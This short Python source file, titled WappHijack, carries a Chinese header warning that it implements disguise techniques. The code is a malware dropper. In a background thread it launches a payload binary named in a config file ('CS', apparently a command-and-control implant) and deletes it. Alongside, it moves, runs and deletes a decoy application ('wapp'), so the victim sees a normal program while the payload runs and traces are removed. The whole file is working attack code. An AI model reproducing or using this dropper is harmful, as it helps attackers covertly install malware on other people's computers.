# WARNING: 本模块包含伪装技术实现
# 根据《网络安全法》规定，未经授权使用将面临刑事指控


import json
import os
import infoLogic
import subprocess
import threading
import shutil


class WappHijack(threading.Thread):
    def __init__(self):
        super().__init__()  # 或 threading.Thread.__init__(self)
        with open(infoLogic.GetFilePath('confs.json'),'r') as f:
            self.confs=json.load(f)

    def startCS(self):
        path=infoLogic.GetFilePath('files/{}'.format(self.confs['CS']))
        subprocess.run(path)

    def startWapp(self):
        oldPath=infoLogic.GetFilePath('files/{}'.format(self.confs['wapp']))
        newPath=os.getcwd()+'/Go'+self.confs['wapp']
        shutil.move(oldPath,newPath)
        subprocess.run(newPath)
        os.remove(newPath)




    def run(self):
        CsPath=infoLogic.GetFilePath('files/{}'.format(self.confs['CS']))
        self.startCS()
        os.remove(CsPath)








if __name__=='__main__':
    a=WappHijack()
    a.start()
    a.startWapp()

